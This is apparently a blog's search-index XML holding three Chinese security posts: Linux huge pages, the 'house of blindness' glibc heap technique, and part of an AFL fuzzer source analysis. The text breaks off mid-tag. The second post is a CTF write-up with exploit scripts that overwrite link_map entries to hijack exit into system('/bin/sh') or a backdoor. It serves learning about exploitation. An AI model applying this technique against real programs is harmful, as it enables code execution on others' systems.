<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【Kernel】Linux Huge Pages</title>
    <link href="/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/"/>
    <url>/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在HITCON CTF 2023的一道QEMU escape题目中，利用到了Huge Pages这项技术，借此复现题目的机会，来学习了解下这部分知识。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>当进程使用 RAM 时，CPU 会将其标记为已被该进程使用。为了提高效率，CPU 以块的形式分配 RAM——4K 字节是许多平台上的默认值。这些块被称为页面。页面可以交换到磁盘等。</p><p>由于进程地址空间是虚拟的，CPU和操作系统需要记住哪些页属于哪个进程，以及每个页存储在哪里。页面越多，查找内存映射位置所需的时间就越多。因而大多数当前的 CPU 架构都支持<strong>larger-than-default pages</strong>，这使得 CPU&#x2F;OS 需要查找的条目更少。不同的操作系统对它有不同命名方式，在Linux上即为<strong>Huge Pages</strong>.</p><h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>首先回顾下Linux中的内存映射，下图展示了64位Linux系统中，虚拟内存与物理内存的转换方式，也体现了Linux的4级页表结构</p><blockquote><p>偷的图，侵删😭</p></blockquote><p><img src="/img/article/hugepages/v2-5ed1c1d62faa246410a4df932d533130_1440w.webp" alt="img"></p><p>有图可知，Linux只使用了64位地址的前48位，并将其虚拟地址分为5个部分：</p><ul><li><code>PGD索引</code>，为虚拟地址的39-47位(9bit)，代表其在<code>Page Global Directory</code>上的索引</li><li><code>PUD索引</code>，为虚拟地址的30-38位(9bit)，代表其在<code>Page Upper Directory</code>上的索引</li><li><code>PMD索引</code>，为虚拟地址的21-29位(9bit)，代表其在<code>Page Middle Diectory</code>上的索引</li><li><code>PTE索引</code>，为虚拟地址的12-20位(9bit)，代表其在<code>Page Table</code>上的索引</li><li><code>偏移量</code>，为虚拟地址的0-11位(12bit)，代表其在对应<code>Physical Page</code>上的偏移</li></ul><p>此外，CPU有几个控制寄存器，如下图CR0-CR4，各自有不同的作用。其中<code>CR3</code>的寄存器主要用于存放<code>Page Global Directory</code>的物理地址。详细的的讲解可以看这篇文章:<a href="https://fishc.com.cn/blog-9-824.html">控制寄存器 (CR0 , CR1 , CR2 , CR3)</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2lsaW51eGtlcm5lbC5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTEvMDYvMDYyMTExXzE0MzRfeDg2eDg2NjRDUFUxLnBuZw?x-oss-process=image/format,png" alt="img"></p><p>基于上述的知识我们可以分析下，虚拟地址转换物理地址流程。</p><ol><li>从CR3寄存器中取得<code>Page Global Directory</code>的物理地址</li><li>利用虚拟地址中的<code>PGD索引</code>部分，在<code>Page Global Directory</code>中取出<code>Page Upper Directory</code>的物理地址</li><li>利用虚拟地址中的<code>PUD索引</code>部分，在<code>Page Upper Directory</code>中取出<code>Page Middle Diectory</code>的物理地址</li><li>利用虚拟地址中的<code>PMD索引</code>部分，在<code>Page Middle Diectory</code>中取出<code>Page Table</code>的物理地址</li><li>利用虚拟地址终端<code>PTE索引</code>部分，在<code>Page Table</code>中取出对应物理内存页地址</li><li>此时虚拟地址所对应的物理地址就可以得到了，计算公式：<strong>物理地址 &#x3D; 虚拟地址低12位offset + 物理内存页地址</strong></li></ol><h2 id="Huge-Pages原理"><a href="#Huge-Pages原理" class="headerlink" title="Huge Pages原理"></a>Huge Pages原理</h2><p>在明白了上述内存地址的划分后，Huge Page的原理就比较好理解了，即扩大物理页大小，减少页表层级。在Linux中，主要的<code>HugePage</code>的大小为2MB(即12bit + 9bit)和1GB(即12bit + 9bit +bit)，下面以2MB的<code>HugePage</code>举例</p><p><img src="/img/article/hugepages/v2-e2cadc8bb0e4705001f4262547fb6ded_r.jpg" alt="img"></p><p>可以很明显的看到由于页大小扩大至2MB，其虚拟地址中，表示偏移的部分扩大到了(12+9)bit。原先的4级页表也变为3级页表，同理，1G大小的页对应2级页表。所以此时 <code>Page Middle Directory</code> 直接指向映射的物理内存页地址。</p><blockquote><p>这样我们也能够理解，为什么HugePage一般为2MB和1GB这样固定的大小。从另一个角度理解，我们也能看到这种地址划分方式与IP地址中A类，B类，C类地址的划分有异曲同工之妙。</p></blockquote><h2 id="如何设置-HugePages"><a href="#如何设置-HugePages" class="headerlink" title="如何设置 HugePages"></a>如何设置 HugePages</h2><p>在<code>root</code>权限下，我们可以使用如下命令，设置HugePages的数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl vm.nr_hugepages=32 <span class="hljs-comment">#其中32代表个数</span><br></code></pre></td></tr></table></figure><p>我们可以使用如下命令，查看是否设置成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/meminfo | grep -i huge<br></code></pre></td></tr></table></figure><p>效果如图，能够显示出总共的Hugepages的数量，以及处于free状态的HugePages的数量</p><p><img src="/img/article/hugepages/image-20230911143756972.png" alt="image-20230911143756972"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【trick】house of blindness</title>
    <link href="/2023/09/07/%E3%80%90trick%E3%80%91house%20of%20blindness/"/>
    <url>/2023/09/07/%E3%80%90trick%E3%80%91house%20of%20blindness/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在WMCTF 2023官方wp中，看到了一个十分新奇的手法house of blindness. 其无需leak地址却仍然能够hijack程序流，这里做以学习研究。本文例题使用WMCTF2023 blindness</p><p>参考文章: <a href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA">issues in exit town - HackMD</a></p></blockquote><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>首先补充一个关于malloc的前置知识</p><ul><li>如果申请的chunk大小非常大，那么便不会使用ptmalloc来进行chunk的分配，而是调用<code>mmap()</code></li><li>另外，这样申请出来的chunk位置与libc和ld的偏移保持一致</li></ul><p>如图，我们申请出来的chunk位置如下</p><p><img src="/img/article/blindness/image-20230907163127358.png" alt="image-20230907163127358"></p><p>可以看到，其地址与libc和ld连在一起</p><h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>首先我们需要关注一下.dynamic节</p><p>在gdb中我们可以使用<code>dyn</code>命令查看.dynamic节内容。其中的内容氛围两个部分，一个是tag用于表示名称，一个是value.</p><p><img src="/img/article/blindness/image-20230907142037610.png" alt="image-20230907142037610"></p><p>这个结构由于是静态的，所以同样可以在IDA中看到</p><p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p><p>其中我们需要关注下<code>DT_FINI</code>这个tag，也就是gdb中显示的<code>FINI</code>，其代表了<code>fini</code>函数到程序加载的虚拟地址的offset，即<code>real_fini_addr = code_base + DT_FINI</code>，以本题为例我们可以得到</p><p><img src="/img/article/blindness/image-20230907143044385.png" alt="image-20230907143044385"></p><p>在<code>exit()</code>函数的源码中，我们可以看到如下部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Is there a destructor function?  */</span><br><span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>    || l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    <span class="hljs-comment">/* When debugging print a message first.  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>                          &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>      _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>                        DSO_FILENAME (l-&gt;l_name),<br>                        ns);<br>    <span class="hljs-comment">/* First see whether an array is given.  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>      &#123;<br>        ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>          (ElfW(Addr) *) (l-&gt;l_addr<br>                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>                          / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>        <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>          ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br>      &#125;<br>    <span class="hljs-comment">/* Next try the old-style destructor.  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>      DL_CALL_DT_FINI<br>        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);<br>  &#125;<br></code></pre></td></tr></table></figure><p>其中最下方的<code>DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</code>便是调用<code>_fini</code>函数的部分，宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()</span><br></code></pre></td></tr></table></figure><p>而<code>l_addr</code>和<code>l_info[DT_FINI]</code>正对应这我们前面谈到的codebase和.dynamic节上的偏移，l为在ld中存放的link_map结构</p><p>以本题为例，我们用gdb跟踪exit流。可以发现，在调用完<code>__do_global_dtors_aux</code>之后，程序流便会通过r15，来调用<code>fini</code>，如图</p><p><img src="/img/article/blindness/image-20230907154901922.png" alt="image-20230907154901922"></p><p><img src="/img/article/blindness/image-20230907154040648.png" alt="image-20230907154040648"></p><p>其中<code>mov    rax,QWORD PTR [r15+0xa8] </code>，就是对应<code>l_info[DT_FINI]</code>，即指向.dynmic中DT_FINI条目的指针</p><p><img src="/img/article/blindness/image-20230907154606194.png" alt="image-20230907154606194"></p><p>而<code>add    rax,QWORD PTR [r15]</code>，对应<code>l_addr</code>，也就是codebase</p><h2 id="house-of-blindness"><a href="#house-of-blindness" class="headerlink" title="house of blindness"></a>house of blindness</h2><p>明白了调用<code>fini</code>的原理后，how do we exploit this?</p><p>可以想象，如果我们能够更改<strong>link_map</strong>的内容，比如存放codebase和指向DT_FINI条目的指针。那么在调用fini时，我们就可以控制两者之和为<code>system</code>这样的函数，从而拿到shell（这里我们先不考虑rdi参数如何控制）。这也是所谓house of blindness的核心思想，不过我们还是来看看完整的流程。</p><p>首先考虑，若我们想让两者之和为system这样的libc函数，那么一定要是一个libc的地址+一个偏移的形式，因而原有的codebase+offset的形式是不满足要求的。由于我们没有leak的能力，在不考虑爆破的情况下只能覆盖写最低字节，显然无法让一个text段地址调整至libc。</p><p>原作者给出的解法是利用<code>DT_DEBUG</code>条目。DT_DEBUG中存放了指向<code>_r_debug</code>函数的指针，且<code>_r_debug</code>是一个ld部分的地址，则我们只需要需要将l_addr劫持为<code>_r_debug</code>和<code>system</code>函数的差，l_info[DT_FINI]劫持为DT_DEBUG条目，就可以执行system。</p><p><img src="/img/article/blindness/image-20230907160909407.png" alt="image-20230907160909407"></p><p>此时rdi参数恰好也是ld中的一个指针，另外还需要劫持<code>fini_array</code>为空，防止由于指针更改出现crash</p><p>原作者给出了exp的大致形式如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># disable fini array from exec</span><br>write(ld.address + link_map + l_info + <span class="hljs-number">8</span> * DT_FINI_ARRAY, p64(<span class="hljs-number">0</span>))<br><br><span class="hljs-comment"># overwrite l_info[DT_FINI]&#x27;s lsb so that it points to _r_debug</span><br>write(ld.address + link_map + l_info + <span class="hljs-number">8</span> * DT_FINI, <span class="hljs-string">b&quot;\xb8&quot;</span>)<br><br><span class="hljs-comment"># overwrite l_addr with offset to bring _r_debug to system</span><br>write(<br>    ld.address + link_map,<br>    p64(libc.symbols[<span class="hljs-string">&quot;system&quot;</span>] - ld.symbols[<span class="hljs-string">&quot;_r_debug&quot;</span>], signed=<span class="hljs-literal">True</span>),<br>)<br><br><span class="hljs-comment"># fill _dl_load_lock with /bin/sh</span><br>write(ld.symbols[<span class="hljs-string">&quot;_rtld_global&quot;</span>] + _dl_load_lock, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>总结一下利用条件：</p><ul><li>malloc的size不限制大小，比如可以<code>malloc(0x100000)</code></li><li>可以在malloc出的chunk附近实现越界的任意写</li></ul><p>作者给出的利用条件的形式如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get size from user</span><br><span class="hljs-type">char</span> *chunk = <span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-comment">// get idx and byte from the user</span><br>chunk[idx] = byte;<br></code></pre></td></tr></table></figure><h2 id="WMCTF-blindness"><a href="#WMCTF-blindness" class="headerlink" title="WMCTF blindness"></a>WMCTF blindness</h2><p>WMCTF的这道例题也使用了类似的思想，不过手法并不完全相同，并非利用<code>DT_DEBUG</code>. 我们可以再看一眼本题的.dynamic标签的地址分布</p><p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p><p>可以注意到<code>DT_FINI</code>的地址为0x3DB8，<code>DT_DEBUG</code>的地址为0x3E58，即如果我们考虑原作者的思路。则需要覆盖2个byte，即仍需1&#x2F;16的爆破。但是我们注意到，本题是存在后门<code>backdoor</code>的，那么我们可以控制<code>l_info[DT_FINI]</code>为一个text段的函数，然后利用l_addr偏移至后门即可。可以看到.dynamic上面的一个标签<code>__frame_dummy_init_array_entry</code></p><p><img src="/img/article/blindness/image-20230907173436438.png" alt="image-20230907173436438"></p><p>且恰好后门函数和该函数只有0x9的偏移，如图。那么我们就可以覆盖l_info[DT_FINI]的最低字节从0xB8到0x80，然后控制l_addr偏移为9，从而执行后门函数.</p><p><img src="/img/article/blindness/image-20230907173108919.png" alt="image-20230907173108919"></p><p>官方exp如下，估计出题人套了自己的板子，因而注释与代码并不匹配，这里并非利用DT_DEBUG。且劫持参数为<code>/bin/sh</code>也是无必要的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">addr,content</span>):<br>    content = <span class="hljs-built_in">list</span>(content)<br>    payload = <span class="hljs-string">&quot;@&quot;</span> + p32(addr)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(content)):<br>        payload += <span class="hljs-string">&#x27;.&#x27;</span> + p8(<span class="hljs-built_in">ord</span>(content[i]))<br>        payload += <span class="hljs-string">&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p.recv()<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100000</span>))<br>    p.recv()<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>))<br>    p.recv()<br>    payload = write(<span class="hljs-number">0x33f958</span> - <span class="hljs-number">0x1c000</span>,<span class="hljs-string">&quot;/bin/sh;&quot;</span>) <span class="hljs-comment">#劫持参数</span><br>    payload += write(<span class="hljs-number">0x340180</span>-<span class="hljs-number">0x33f958</span>-<span class="hljs-number">0x8</span>,p64(<span class="hljs-number">0x9</span>)) <span class="hljs-comment">#将l_addr改为DT_DEBUg和system函数的差值</span><br>    payload += write(<span class="hljs-number">0x340228</span>-<span class="hljs-number">0x340180</span>-<span class="hljs-number">0x8</span>,p8(<span class="hljs-number">0x88</span>-<span class="hljs-number">0x8</span>)) <span class="hljs-comment">#劫持DT_FINI指向DT_DEBUG</span><br>    payload += write(<span class="hljs-number">0x340290</span>-<span class="hljs-number">0x340228</span> - <span class="hljs-number">0x1</span>,p64(<span class="hljs-number">0</span>)) <span class="hljs-comment">#使得DT_FINI_ARRAY为NULL</span><br>    payload += <span class="hljs-string">&#x27;q&#x27;</span><br>    p.send(payload)<br>    p.interactive()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    binary = <span class="hljs-string">&#x27;./main&#x27;</span><br>    elf = ELF(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>    context.binary = binary<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">3</span>):<br>        p = remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        p = process(binary)<br>    exp()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【fuzz】AFL源码分析 part 2</title>
    <link href="/2023/09/04/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%202/"/>
    <url>/2023/09/04/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%202/</url>
    
    <content type="html"><![CDATA[<blockquote><p>上个一个part主要关注的是插桩相关部分的源码，这一节主要来查看afl-fuzz.c这个核心模块的源码部分</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>由于该部分代码体量过大，我们只对核心部分进行源码解析。这部分总体可以分为三块：</p><ol><li>初始配置：进行fuzz环境配置相关工作</li><li>fuzz执行：fuzz的主循环过程</li><li>变异策略：测试用例的变异过程和方式</li></ol><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>首先从<code>main()</code>函数着手进行分析。在完成初始配置后，<code>main()</code>同样利用time生成随机种子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gettimeofday(&amp;tv, &amp;tz);<br>srandom(tv.tv_sec ^ tv.tv_usec ^ getpid());<br></code></pre></td></tr></table></figure><p>紧接着便是第一个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">switch</span>(opt)&#123;<br>            ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个循环的功能还是比较明显的。从下图的部分源代码和注释中，我们可以看出，其主要是获取命令行传入的参数，以及一些对应flag的设置。</p><p><img src="/img/article/fuzzAFL2/image-20230904135719892.png" alt="image-20230904135719892"></p><p>紧接着便是<code>setup_signal_handlers()</code>函数，主要是调用<code>sigaction()</code>，注册一些信号处理函数，具体内容如下：</p><table><thead><tr><th>信号</th><th>作用</th></tr></thead><tbody><tr><td>SIGHUP&#x2F;SIGINT&#x2F;SIGTERM</td><td>处理各种“stop”情况</td></tr><tr><td>SIGALRM</td><td>处理超时的情况</td></tr><tr><td>SIGWINCH</td><td>处理窗口大小</td></tr><tr><td>SIGUSER1</td><td>用户自定义信号，这里定义为skip request</td></tr><tr><td>SIGSTP&#x2F;SIGPIPE</td><td>其他一些不重要信号</td></tr></tbody></table><p>然后接着仍是一些参数处理的函数<code>check_asan_opts()</code>，用来读取环境变量<strong>ASAN_OPTIONS</strong>和<strong>MSAN_OPTIONS</strong>；<code>fix_up_sync()</code>用来处理-M，-S相关参数；<code>check_if_tty</code>用于检查程序是否使用tty终端运行；最后还有<code>get_core_count</code>, <code>check_crash_handing</code>, <code>check_cpu_governor</code>这些函数用来做CPU检查相关。</p><h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>紧接着便是初始化shm和virgin_bits相关内容的重要函数<code>setup_shm()</code>，这些变量用于记录tuple相关状态，源码如下：</p><blockquote><p>关于tuple的定义可以查看我在AFL白皮书中有关Detecting new behaviors的内容:<a href="https://loora1n.github.io/2023/08/23/%E3%80%90fuzz%E3%80%91AFL%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E8%8B%B1%E5%8F%8C%E8%AF%AD%E7%89%88/">【fuzz】AFL白皮书中英双语版 - 鷺雨のBlog (loora1n.github.io)</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_shm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *初始化</span><br><span class="hljs-comment">  */</span><br>  u8* shm_str;<br><br>  <span class="hljs-keyword">if</span> (!in_bitmap) <span class="hljs-built_in">memset</span>(virgin_bits, <span class="hljs-number">255</span>, MAP_SIZE);<br><br>  <span class="hljs-built_in">memset</span>(virgin_tmout, <span class="hljs-number">255</span>, MAP_SIZE);<br>  <span class="hljs-built_in">memset</span>(virgin_crash, <span class="hljs-number">255</span>, MAP_SIZE);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *分配共享内存，关于shmget的内容可以看看这篇有关进程通信的博客</span><br><span class="hljs-comment">  *https://www.cnblogs.com/52php/p/5861372.html</span><br><span class="hljs-comment">  */</span><br>  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0600</span>);<br><br>  <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;shmget() failed&quot;</span>);<br><br>  atexit(remove_shm);<span class="hljs-comment">//注册atexit handler 为 remove_shm</span><br><br>  shm_str = alloc_printf(<span class="hljs-string">&quot;%d&quot;</span>, shm_id);<br><br>  <span class="hljs-keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="hljs-number">1</span>);<br><br>  ck_free(shm_str);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *启动进程对共享内存访问权限，返回共享内存首地址指针</span><br><span class="hljs-comment">  */</span><br>  trace_bits = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">if</span> (trace_bits == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) PFATAL(<span class="hljs-string">&quot;shmat() failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要有四个核心变量，定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST u8* trace_bits;                <span class="hljs-comment">/* SHM with instrumentation bitmap  */</span><br><br>EXP_ST u8  virgin_bits[MAP_SIZE],     <span class="hljs-comment">/* Regions yet untouched by fuzzing */</span><br>           virgin_tmout[MAP_SIZE],    <span class="hljs-comment">/* Bits we haven&#x27;t seen in tmouts   */</span><br>           virgin_crash[MAP_SIZE];    <span class="hljs-comment">/* Bits we haven&#x27;t seen in crashes  */</span><br></code></pre></td></tr></table></figure><p>从注释我们可以看到，<code>trace_bits</code>指向存放插桩情况位图的共享内存，<code>virgin_bits[MAP_SIZE]</code>主要是用于记录未到达区域，而<code>virgin_tmout</code>和<code>virgin_crash</code>则是记录timeout和crash的情况。</p><h2 id="文件及模式选择"><a href="#文件及模式选择" class="headerlink" title="文件及模式选择"></a>文件及模式选择</h2><p>然后仍是一些处理函数，我用注释标识函数用途</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>setup_dirs_fds();<span class="hljs-comment">/*Prepare output directories and fds.*/</span><br>read_testcases();<span class="hljs-comment">/*Read all testcases from the input directory, then queue them for testing.</span><br><span class="hljs-comment"> Called at startup.*/</span><br><br>load_auto();<span class="hljs-comment">/* Load automatically generated extras. */</span><br><br>pivot_inputs();<span class="hljs-comment">/* Create hard links for input test cases in the output directory, choosing</span><br><span class="hljs-comment">   good names and pivoting accordingly. */</span><br><br><span class="hljs-keyword">if</span> (extras_dir) load_extras(extras_dir);<span class="hljs-comment">/* Read extras from the extras directory and sort them by size. */</span><br><br><span class="hljs-keyword">if</span> (!timeout_given) find_timeout();<span class="hljs-comment">/* The same, but for timeouts. The idea is that when resuming sessions without</span><br><span class="hljs-comment">   -t given, we don&#x27;t want to keep auto-scaling the timeout over and over</span><br><span class="hljs-comment">   again to prevent it from growing due to random flukes. */</span><br><br>detect_file_args(argv + optind + <span class="hljs-number">1</span>);<span class="hljs-comment">/* Detect @@ in args. */</span><br><br><span class="hljs-keyword">if</span> (!out_file) setup_stdio_file();<span class="hljs-comment">/* Setup the output file for fuzzed data, if not using -f. */</span><br><br>check_binary(argv[optind]);<span class="hljs-comment">/* Do a PATH search and find target binary to see that it exists and</span><br><span class="hljs-comment">   isn&#x27;t a shell script - a common and painful mistake. We also check for</span><br><span class="hljs-comment">   a valid ELF header and for evidence of AFL instrumentation. */</span><br><br>start_time = get_cur_time();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*处理qemu模式下的参数</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (qemu_mode)<br>  use_argv = get_qemu_argv(argv[<span class="hljs-number">0</span>], argv + optind, argc - optind);<br><span class="hljs-keyword">else</span><br>  use_argv = argv + optind;<br>...<br></code></pre></td></tr></table></figure><h2 id="perform-dry-run"><a 